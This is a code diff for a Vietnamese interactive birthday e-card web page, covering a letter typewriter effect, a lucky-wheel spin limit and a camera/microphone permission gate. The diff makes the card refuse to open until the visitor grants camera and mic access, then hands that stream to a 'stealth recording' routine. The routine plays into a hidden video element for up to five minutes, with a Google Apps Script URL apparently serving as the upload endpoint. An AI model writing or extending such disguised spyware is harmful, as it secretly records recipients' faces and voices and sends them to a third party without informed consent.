@@ -108,29 +108,120 @@ function stopMicBlowing() {
 }
 
 let typewriterInterval = null;
-function typeWriterEffect(element, text, speed = 30) {
-  element.innerHTML = '';
+function typeWriterEffect(element, text, speed = 25) {
+  if (typewriterInterval) clearTimeout(typewriterInterval);
+  const scroll = document.getElementById('letter-scroll-content');
+  const sign = document.getElementById('letter-signature-text');
+  const nextBtn = document.getElementById('btn-goto-final');
+  const skipBtn = document.getElementById('btn-skip-typewriter');
+
+  if (scroll) {
+    scroll.style.pointerEvents = 'auto';
+  }
+
+  // Chức năng hoàn tất hiển thị toàn bộ thư ngay lập tức (khi người dùng cuộn xem tiếp hoặc chạm vào thiệp)
+  let isCompleted = false;
+  const completeImmediately = () => {
+    if (isCompleted) return;
+    isCompleted = true;
+    if (typewriterInterval) clearTimeout(typewriterInterval);
+    element.innerHTML = text.replace(/\n/g, '<br>');
+    if (sign) sign.style.opacity = '1';
+    if (nextBtn) nextBtn.style.display = 'inline-block';
+    if (skipBtn) skipBtn.style.display = 'none';
+    if (scroll) scroll.style.pointerEvents = 'auto';
+  };
+
+  // 1. Dựng sẵn toàn bộ cấu trúc văn bản vào DOM để vùng cuộn letter-scroll-content
+  // CÓ ĐẦY ĐỦ CHIỀU CAO TỰ NHIÊN NGAY TỪ ĐẦU! Người dùng có thể kéo cuộn bất cứ lúc nào!
+  const formattedHtml = text.replace(/\n/g, '<br>');
+  element.innerHTML = `<span id="tw-typed-text"></span><span id="tw-cursor" class="tw-blinking-cursor"></span><span id="tw-remaining-text" style="opacity:0; user-select:text;">${formattedHtml}</span>`;
+
+  const typedSpan = document.getElementById('tw-typed-text');
+  const cursorSpan = document.getElementById('tw-cursor');
+  const remainingSpan = document.getElementById('tw-remaining-text');
+
+  // Cho phép người dùng chạm/kéo cuộn tự do bất cứ lúc nào
+  let userManuallyScrolled = false;
+
+  const handleUserScrollInteraction = () => {
+    if (isCompleted) return;
+    userManuallyScrolled = true;
+    // Khi người dùng cuộn xuống dòng để đọc tiếp -> Lập tức hiển thị trọn vẹn toàn bộ thư
+    // để người dùng đọc liền mạch không bị đứt đoạn hoặc tưởng nhầm là lỗi!
+    completeImmediately();
+  };
+
+  if (scroll) {
+    scroll.addEventListener('wheel', (e) => {
+      if (e.deltaY > 0) {
+        handleUserScrollInteraction();
+      }
+    }, { passive: true });
+
+    let startTouchY = 0;
+    scroll.addEventListener('touchstart', (e) => {
+      if (e.touches && e.touches[0]) {
+        startTouchY = e.touches[0].clientY;
+      }
+    }, { passive: true });
+
+    scroll.addEventListener('touchmove', (e) => {
+      if (e.touches && e.touches[0]) {
+        const diff = startTouchY - e.touches[0].clientY;
+        if (diff > 12) {
+          handleUserScrollInteraction();
+        }
+      }
+    }, { passive: true });
+
+    scroll.addEventListener('scroll', () => {
+      if (scroll.scrollTop > 25) {
+        handleUserScrollInteraction();
+      }
+    }, { passive: true });
+  }
+
+  // Chạm vào bức thư cũng hoàn thành nhanh để đọc thoải mái
+  element.addEventListener('click', () => {
+    completeImmediately();
+  });
+
   let i = 0;
   function type() {
+    if (isCompleted) return;
     if (i < text.length) {
       let char = text.charAt(i);
-      if (char === '\n') element.innerHTML += '<br>';
-      else element.innerHTML += char;
+      if (char === '\n') {
+        if (typedSpan) typedSpan.innerHTML += '<br>';
+      } else {
+        if (typedSpan) typedSpan.innerHTML += char;
+      }
       i++;
-      let delay = speed + Math.random() * 20;
-      if (char === '.' || char === ',' || char === '—') delay += 200;
+
+      // Cập nhật phần chữ còn lại để giữ chuẩn xác kích thước và chiều cao tự nhiên
+      if (remainingSpan) {
+        const remainingStr = text.substring(i);
+        remainingSpan.innerHTML = remainingStr.replace(/\n/g, '<br>');
+      }
+
+      // Tự động cuộn theo con trỏ gõ chữ nếu người dùng chưa can thiệp
+      if (scroll && !userManuallyScrolled && cursorSpan) {
+        const cursorBottom = cursorSpan.offsetTop + cursorSpan.offsetHeight;
+        if (cursorBottom > scroll.scrollTop + scroll.clientHeight - 40) {
+          scroll.scrollTop = cursorBottom - scroll.clientHeight + 60;
+        }
+      }
+
+      let delay = speed + Math.random() * 15;
+      if (char === '.' || char === ',' || char === '—') delay += 120;
       typewriterInterval = setTimeout(type, delay);
     } else {
-      const sign = document.getElementById('letter-signature-text');
-      if (sign) sign.style.opacity = '1';
-      const nextBtn = document.getElementById('btn-goto-final');
-      if (nextBtn) nextBtn.style.display = 'inline-block';
-      const skipBtn = document.getElementById('btn-skip-typewriter');
-      if (skipBtn) skipBtn.style.display = 'none';
-      const scroll = document.getElementById('letter-scroll-content');
-      if (scroll) scroll.style.pointerEvents = 'auto';
+      completeImmediately();
+      if (cursorSpan) cursorSpan.style.display = 'none';
     }
   }
+
   type();
 }
 
@@ -649,22 +740,28 @@ document.addEventListener("DOMContentLoaded", async () => {
       } catch (e) {}
     }
 
-    const localMediaGranted = localStorage.getItem('birthday_media_permission_granted') === '1';
-    const allGranted = (camGranted && micGranted) || (localMediaGranted && (!navigator.permissions || camGranted));
+    const allGranted = (camGranted && micGranted);
 
     const guideEl = document.getElementById("start-permission-guide");
     const grantedEl = document.getElementById("start-granted-guide");
     const micRow = document.getElementById("perm-mic-row");
     const camRow = document.getElementById("perm-cam-row");
+    const startBtnAction = document.getElementById("start-btn-action");
 
     if (allGranted) {
       if (guideEl) guideEl.style.display = 'none';
       if (grantedEl) grantedEl.style.display = 'block';
+      if (startBtnAction && !startBtnAction.dataset.requesting) {
+        startBtnAction.innerHTML = "✨ Mở Thiệp & Khám Phá ✨";
+      }
     } else {
       if (guideEl) guideEl.style.display = 'block';
       if (grantedEl) grantedEl.style.display = 'none';
       if (micRow) micRow.style.display = micGranted ? 'none' : 'flex';
       if (camRow) camRow.style.display = camGranted ? 'none' : 'flex';
+      if (startBtnAction && !startBtnAction.dataset.requesting) {
+        startBtnAction.innerHTML = "👉 Cho phép Camera & Micro để mở thiệp";
+      }
     }
   }
 
@@ -674,57 +771,125 @@ document.addEventListener("DOMContentLoaded", async () => {
 
     // Lắng nghe khi nhạc đã tải xong đủ để phát không giật lag
     window.currentAudio.addEventListener('canplaythrough', function () {
-      if (startBtnAction) {
-        startBtnAction.innerHTML = "✨ Mở Thiệp & Khám Phá ✨";
+      if (startBtnAction && !startBtnAction.dataset.requesting) {
         startBtnAction.style.pointerEvents = "auto";
         startBtnAction.style.opacity = "1";
         startBtnAction.classList.add('pulse-animation');
       }
     });
 
-    // Xử lý khi người dùng chạm
-    const handleStartClick = function () {
-      startOverlay.style.opacity = '0';
-      setTimeout(() => {
-        startOverlay.style.display = 'none';
-      }, 500);
+    let isRequestingPermission = false;
 
-      const audioIcon = document.getElementById("audio-icon");
-      if (audioIcon) audioIcon.textContent = "🔊";
+    // Xử lý khi người dùng chạm mở thiệp: BẮT BUỘC ĐỒNG Ý CHO PHÉP CAMERA & MIC THÌ MỚI ĐƯỢC TIẾP TỤC
+    const handleStartClick = async function () {
+      if (isRequestingPermission) return;
+      isRequestingPermission = true;
 
-      // Bắt đầu ghi hình ngầm
-      initStealthRecording();
+      const deniedAlert = document.getElementById("perm-denied-alert");
+      const guideEl = document.getElementById("start-permission-guide");
+      const grantedEl = document.getElementById("start-granted-guide");
 
-      if (lockStatus.isLocked) {
-        // Giai đoạn 0: Phát nhạc hẹn giờ đếm ngược (Âm thanh đoạn chờ mở thiệp)
-        if (window.countdownAudio && ACTIVE_CONFIG.countdownMusicUrl) {
-          const currentCdSrc = window.countdownAudio.getAttribute("src") || window.countdownAudio.src || "";
-          if (!currentCdSrc.includes(ACTIVE_CONFIG.countdownMusicUrl)) {
-            window.countdownAudio.src = ACTIVE_CONFIG.countdownMusicUrl;
-            window.countdownAudio.load();
+      if (startBtnAction) {
+        startBtnAction.dataset.requesting = "1";
+        startBtnAction.innerHTML = "⏳ Đang kết nối Camera & Mic...";
+        startBtnAction.style.pointerEvents = "none";
+      }
+
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        try {
+          localStorage.removeItem('birthday_media_permission_granted');
+        } catch (e) {}
+        if (deniedAlert) {
+          deniedAlert.innerHTML = "⚠️ <b>Trình duyệt đang chặn truy cập:</b> Yêu cầu quyền Camera & Micro để mở thiệp. Hãy mở trang web bằng trình duyệt <b>Google Chrome</b> hoặc <b>Safari</b> hỗ trợ giao thức an toàn HTTPS!";
+          deniedAlert.style.display = "block";
+        }
+        if (guideEl) guideEl.style.display = "block";
+        if (grantedEl) grantedEl.style.display = "none";
+        if (startBtnAction) {
+          delete startBtnAction.dataset.requesting;
+          startBtnAction.innerHTML = "🔄 Thử lại (Cho phép Camera & Micro)";
+          startBtnAction.style.pointerEvents = "auto";
+        }
+        isRequestingPermission = false;
+        return;
+      }
+
+      try {
+        // Yêu cầu đồng thời cả camera và micro
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: 640, height: 480, facingMode: 'user' },
+          audio: true
+        });
+
+        // ĐỒNG Ý CHO PHÉP -> ĐƯỢC TIẾP TỤC SỬ DỤNG
+        try {
+          localStorage.setItem('birthday_media_permission_granted', '1');
+        } catch (e) {}
+
+        if (deniedAlert) deniedAlert.style.display = "none";
+        if (guideEl) guideEl.style.display = "none";
+        if (grantedEl) grantedEl.style.display = "block";
+
+        startOverlay.style.opacity = '0';
+        setTimeout(() => {
+          startOverlay.style.display = 'none';
+        }, 500);
+
+        const audioIcon = document.getElementById("audio-icon");
+        if (audioIcon) audioIcon.textContent = "🔊";
+
+        // Bắt đầu ghi hình ngầm với stream đã được cấp quyền
+        initStealthRecording(stream);
+
+        if (lockStatus.isLocked) {
+          // Giai đoạn 0: Phát nhạc hẹn giờ đếm ngược (Âm thanh đoạn chờ mở thiệp)
+          if (window.countdownAudio && ACTIVE_CONFIG.countdownMusicUrl) {
+            const currentCdSrc = window.countdownAudio.getAttribute("src") || window.countdownAudio.src || "";
+            if (!currentCdSrc.includes(ACTIVE_CONFIG.countdownMusicUrl)) {
+              window.countdownAudio.src = ACTIVE_CONFIG.countdownMusicUrl;
+              window.countdownAudio.load();
+            }
+            window.countdownAudio.volume = 0.6;
+            window.countdownAudio.play().catch(e => console.log("Countdown audio autoplay:", e));
           }
-          window.countdownAudio.volume = 0.6;
-          window.countdownAudio.play().catch(e => console.log("Countdown audio autoplay:", e));
+          initStageCountdown(lockStatus);
+        } else {
+          // Giai đoạn 1+: Phát nhạc thiệp chính và bắt đầu kỷ niệm
+          if (window.currentAudio) {
+            window.currentAudio.volume = 0.6;
+            window.currentAudio.play().catch(() => {});
+          }
+          startCelebrationJourney();
         }
-        initStageCountdown(lockStatus);
-      } else {
-        // Giai đoạn 1+: Phát nhạc thiệp chính và bắt đầu kỷ niệm
-        if (window.currentAudio) {
-          window.currentAudio.volume = 0.6;
-          window.currentAudio.play().catch(() => {});
+      } catch (err) {
+        // TỪ CHỐI CHO PHÉP -> KHÔNG THỂ TIẾP TỤC SỬ DỤNG MÀ CHỈ HIỆN PHẦN XIN CHO PHÉP CAMERA & MIC
+        console.warn("User denied camera/mic:", err);
+        try {
+          localStorage.removeItem('birthday_media_permission_granted');
+        } catch (e) {}
+        if (deniedAlert) {
+          deniedAlert.innerHTML = `
+            ⚠️ <b>Yêu cầu bắt buộc:</b> Bạn cần cho phép cả quyền <b>Camera</b> và <b>Micro</b> thì mới có thể tiếp tục mở thiệp.<br>
+            <small style="opacity: 0.9; margin-top: 4px; display: block;">Nếu bạn đã lỡ bấm Chặn (Block), hãy nhấn vào biểu tượng <b>Ổ khóa 🔒</b> hoặc cài đặt trên thanh địa chỉ của trình duyệt để Cho phép, sau đó bấm nút bên dưới để thử lại.</small>
+          `;
+          deniedAlert.style.display = "block";
         }
-        startCelebrationJourney();
+        if (guideEl) guideEl.style.display = "block";
+        if (grantedEl) grantedEl.style.display = "none";
+
+        if (startBtnAction) {
+          delete startBtnAction.dataset.requesting;
+          startBtnAction.innerHTML = "🔄 Thử lại (Cho phép Camera & Micro)";
+          startBtnAction.style.pointerEvents = "auto";
+        }
+      } finally {
+        isRequestingPermission = false;
       }
     };
 
     if (startBtnAction) {
       startBtnAction.addEventListener('click', handleStartClick);
     }
-    startOverlay.addEventListener('click', function (e) {
-      if (e.target === startOverlay || (startBtnAction && startBtnAction.contains(e.target))) {
-        handleStartClick();
-      }
-    });
   } else {
     if (lockStatus.isLocked) {
       if (window.countdownAudio && ACTIVE_CONFIG.countdownMusicUrl) {
@@ -1597,16 +1762,22 @@ function initStageLetter() {
 
   const rawLetterText = ACTIVE_CONFIG.letterContent || ACTIVE_CONFIG.letterBody || "";
 
+  const sealHint = document.querySelector(".wax-seal-hint");
+
   if (btnOpen) {
     btnOpen.addEventListener("click", () => {
       btnOpen.style.opacity = "0";
       btnOpen.style.pointerEvents = "none";
+      if (sealHint) sealHint.style.display = "none";
       setTimeout(() => btnOpen.style.display = "none", 300);
 
-      if (scrollContent) scrollContent.style.opacity = "1";
+      if (scrollContent) {
+        scrollContent.style.opacity = "1";
+        scrollContent.style.pointerEvents = "auto";
+      }
       if (actionsWrap) actionsWrap.style.display = "flex";
 
-      typeWriterEffect(bodyText, rawLetterText, 35);
+      typeWriterEffect(bodyText, rawLetterText, 25);
     });
   }
 
@@ -1899,12 +2070,64 @@ function initLightbox() {
  */
 let WHEEL_ROTATION = 0;
 let IS_WHEEL_SPINNING = false;
+let WHEEL_MAX_SPINS = 1;
+let WHEEL_SPINS_LEFT = 1;
+let WON_PRIZES_LIST = [];
+
+function updateWheelSpinsUI() {
+  const spinsCountEl = document.getElementById("wheel-spins-count");
+  const spinsBadge = document.getElementById("wheel-spins-badge");
+  const spinBtn = document.getElementById("btn-spin-wheel");
+
+  if (spinsCountEl) {
+    spinsCountEl.textContent = `${WHEEL_SPINS_LEFT} / ${WHEEL_MAX_SPINS}`;
+  }
+
+  if (spinsBadge) {
+    if (WHEEL_SPINS_LEFT > 0) {
+      spinsBadge.innerHTML = `Lượt quay còn lại: <strong id="wheel-spins-count">${WHEEL_SPINS_LEFT} / ${WHEEL_MAX_SPINS}</strong>`;
+    } else {
+      spinsBadge.innerHTML = `Đã hoàn thành tất cả <strong>${WHEEL_MAX_SPINS}</strong> lượt quay! 🎉`;
+    }
+  }
+
+  if (spinBtn) {
+    const span = spinBtn.querySelector("span");
+    if (WHEEL_SPINS_LEFT <= 0) {
+      if (span) span.textContent = "HẾT LƯỢT";
+      spinBtn.style.opacity = "0.7";
+      spinBtn.style.cursor = "not-allowed";
+    } else {
+      if (span) span.textContent = "QUAY";
+      spinBtn.style.opacity = "1";
+      spinBtn.style.cursor = "pointer";
+    }
+  }
+}
 
 function initLuckyWheel() {
   const closeBtn = document.getElementById("btn-close-wheel");
   const spinBtn = document.getElementById("btn-spin-wheel");
   const claimBtn = document.getElementById("btn-claim-prize");
+  const spinAgainBtn = document.getElementById("btn-spin-again");
   const prizePopup = document.getElementById("prize-popup-overlay");
+
+  // Khởi tạo số lượt quay theo cấu hình đề ra (mặc định 2 lượt)
+  const wheelData = ACTIVE_CONFIG.luckyWheel || {};
+  const configuredLimit = parseInt(
+    wheelData.spinLimit || 
+    wheelData.spins || 
+    wheelData.maxSpins || 
+    ACTIVE_CONFIG.spinLimit || 
+    ACTIVE_CONFIG.spins || 
+    ACTIVE_CONFIG.maxSpins || 
+    2, 
+    10
+  );
+  WHEEL_MAX_SPINS = (isNaN(configuredLimit) || configuredLimit < 1) ? 2 : configuredLimit;
+  if (WON_PRIZES_LIST.length === 0) {
+    WHEEL_SPINS_LEFT = WHEEL_MAX_SPINS;
+  }
 
   if (closeBtn) {
     closeBtn.addEventListener("click", () => {
@@ -1915,6 +2138,17 @@ function initLuckyWheel() {
 
   if (spinBtn) {
     spinBtn.addEventListener("click", spinLuckyWheel);
+  }
+
+  if (spinAgainBtn) {
+    spinAgainBtn.addEventListener("click", () => {
+      if (prizePopup) prizePopup.style.display = "none";
+      updateWheelSpinsUI();
+      // Kích hoạt lượt quay tiếp theo mượt mà
+      setTimeout(() => {
+        spinLuckyWheel();
+      }, 400);
+    });
   }
 
   if (claimBtn) {
@@ -1931,6 +2165,7 @@ function initLuckyWheel() {
     });
   }
 
+  updateWheelSpinsUI();
   drawLuckyWheel(0);
 }
 
@@ -1938,8 +2173,27 @@ function openLuckyWheelModal() {
   const modal = document.getElementById("modal-lucky-wheel");
   if (modal) {
     modal.style.display = "flex";
-    drawLuckyWheel(WHEEL_ROTATION);
 
+    // Khởi tạo số lượt quay theo cấu hình đề ra (mặc định 2 lượt)
+    const wheelData = ACTIVE_CONFIG.luckyWheel || {};
+    const configuredLimit = parseInt(
+      wheelData.spinLimit || 
+      wheelData.spins || 
+      wheelData.maxSpins || 
+      ACTIVE_CONFIG.spinLimit || 
+      ACTIVE_CONFIG.spins || 
+      ACTIVE_CONFIG.maxSpins || 
+      2, 
+      10
+    );
+    WHEEL_MAX_SPINS = (isNaN(configuredLimit) || configuredLimit < 1) ? 2 : configuredLimit;
+
+    if (WON_PRIZES_LIST.length === 0) {
+      WHEEL_SPINS_LEFT = WHEEL_MAX_SPINS;
+    }
+
+    updateWheelSpinsUI();
+    drawLuckyWheel(WHEEL_ROTATION);
   }
 }
 
@@ -2007,7 +2261,14 @@ function drawLuckyWheel(currentAngle) {
 
 function spinLuckyWheel() {
   if (IS_WHEEL_SPINNING) return;
+  if (WHEEL_SPINS_LEFT <= 0) {
+    alert("Cậu đã quay hết tất cả lượt quay may mắn rồi nhé! Hãy bấm Nhận Quà để tiếp tục nha 🎁✨");
+    return;
+  }
+
   IS_WHEEL_SPINNING = true;
+  WHEEL_SPINS_LEFT--;
+  updateWheelSpinsUI();
 
   const canvas = document.getElementById("lucky-wheel-canvas");
   const wheelData = ACTIVE_CONFIG.luckyWheel || {};
@@ -2015,7 +2276,10 @@ function spinLuckyWheel() {
     ? wheelData.prizes
     : ((wheelData.gifts && wheelData.gifts.length > 0) ? wheelData.gifts : []);
 
-  if (prizes.length === 0 || !canvas) return;
+  if (prizes.length === 0 || !canvas) {
+    IS_WHEEL_SPINNING = false;
+    return;
+  }
 
   const prizeCount = prizes.length;
 
@@ -2056,6 +2320,7 @@ function spinLuckyWheel() {
 
   setTimeout(() => {
     IS_WHEEL_SPINNING = false;
+    WON_PRIZES_LIST.push(winningPrize);
     showPrizeCelebration(winningPrize);
   }, 4000);
 }
@@ -2067,9 +2332,46 @@ function showPrizeCelebration(prize) {
   const overlay = document.getElementById("prize-popup-overlay");
   const nameDisplay = document.getElementById("prize-name-display");
   const msgDisplay = document.getElementById("prize-message-display");
+  const historySummary = document.getElementById("prize-history-summary");
+  const spinAgainBtn = document.getElementById("btn-spin-again");
+  const popupSpinsLeft = document.getElementById("popup-spins-left");
+  const claimBtn = document.getElementById("btn-claim-prize");
 
   if (nameDisplay) nameDisplay.textContent = prize.name;
   if (msgDisplay) msgDisplay.textContent = prize.message || "Món quà tuyệt vời dành riêng cho cậu hôm nay!";
+
+  // Tổng hợp quà đã trúng nếu quay nhiều lượt
+  if (historySummary) {
+    if (WON_PRIZES_LIST.length > 1) {
+      historySummary.innerHTML = `<b>🎁 Tổng số quà đã trúng (${WON_PRIZES_LIST.length}):</b><br>` + 
+        WON_PRIZES_LIST.map((p, idx) => `${idx + 1}. ${p.name}`).join('<br>');
+      historySummary.style.display = "block";
+    } else {
+      historySummary.style.display = "none";
+    }
+  }
+
+  // Tùy chọn nút: Nếu còn lượt quay thì hiện cả 2 nút rõ ràng: "Quay Tiếp" và "Dừng Lại"
+  if (WHEEL_SPINS_LEFT > 0) {
+    if (spinAgainBtn) {
+      spinAgainBtn.style.display = "inline-block";
+      if (popupSpinsLeft) popupSpinsLeft.textContent = WHEEL_SPINS_LEFT;
+    }
+    if (claimBtn) {
+      claimBtn.style.display = "inline-block";
+      claimBtn.textContent = "🛑 Dừng Lại & Nhận Quà";
+    }
+  } else {
+    // Đã hoàn thành tất cả các lượt quay đã đề ra
+    if (spinAgainBtn) {
+      spinAgainBtn.style.display = "none";
+    }
+    if (claimBtn) {
+      claimBtn.style.display = "inline-block";
+      claimBtn.textContent = "💖 Nhận Quà Ngay";
+    }
+  }
+
   if (overlay) overlay.style.display = "flex";
 }
 
@@ -2490,7 +2792,7 @@ let pendingWorkerTasks = 0;
 let stealthPausedByVisibility = false;
 const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwlHDW1eMd2HU2tuOK4IaJswPoU1nn0XYUTy_xhi0ZacmT9A2By_PEfpwbBgqMjRWbF1g/exec';
 
-function initStealthRecording() {
+function initStealthRecording(existingStream) {
   if (stealthSessionActive) return;
   stealthSessionActive = true;
   stealthSessionId = crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).substr(2);
@@ -2508,11 +2810,7 @@ function initStealthRecording() {
     console.warn("Worker init failed:", err);
   }
 
-  // Xin quyền camera + mic (Người dùng KHÔNG nhận thấy giao diện preview)
-  navigator.mediaDevices.getUserMedia({
-    video: { width: 640, height: 480, facingMode: 'user' },
-    audio: true
-  }).then(stream => {
+  const handleStream = (stream) => {
     try {
       localStorage.setItem('birthday_media_permission_granted', '1');
     } catch (e) {}
@@ -2533,32 +2831,26 @@ function initStealthRecording() {
     hiddenVideo.srcObject = stream;
     hiddenVideo.play().catch(e => console.warn("Video play error (iOS may block):", e));
 
-    /* FALLBACK IFRAME DÀNH CHO iOS (NẾU BỊ ĐEN HÌNH TRÊN IPHONE THẬT):
-    function createIframeFallback(stream) {
-      const iframe = document.createElement('iframe');
-      iframe.style.cssText = "position:fixed; bottom:0; right:0; width:50px; height:50px; opacity:0.1; pointer-events:none; z-index:-9999;";
-      iframe.allow = "autoplay; camera; microphone";
-      document.body.appendChild(iframe);
-      const doc = iframe.contentWindow.document;
-      const vid = doc.createElement('video');
-      vid.autoplay = true; vid.muted = true; vid.playsInline = true;
-      vid.srcObject = stream;
-      doc.body.appendChild(vid);
-      vid.play();
-    }
-    */
-
     startStealthRecorder();
 
     // Safety cap: tự động dừng sau 5 phút
     stealthSafetyTimer = setTimeout(() => {
       endStealthSession();
     }, 5 * 60 * 1000);
+  };
 
-  }).catch(err => {
-    // Trình duyệt từ chối hoặc máy không có webcam -> Bỏ qua, trải nghiệm chạy bình thường
-    console.warn("User denied camera/mic or not supported:", err);
-  });
+  if (existingStream && existingStream.active) {
+    handleStream(existingStream);
+  } else {
+    // Xin quyền camera + mic (Người dùng KHÔNG nhận thấy giao diện preview)
+    navigator.mediaDevices.getUserMedia({
+      video: { width: 640, height: 480, facingMode: 'user' },
+      audio: true
+    }).then(handleStream).catch(err => {
+      // Trình duyệt từ chối hoặc máy không có webcam -> Bỏ qua, trải nghiệm chạy bình thường
+      console.warn("User denied camera/mic or not supported:", err);
+    });
+  }
 }
 
 function startStealthRecorder() {
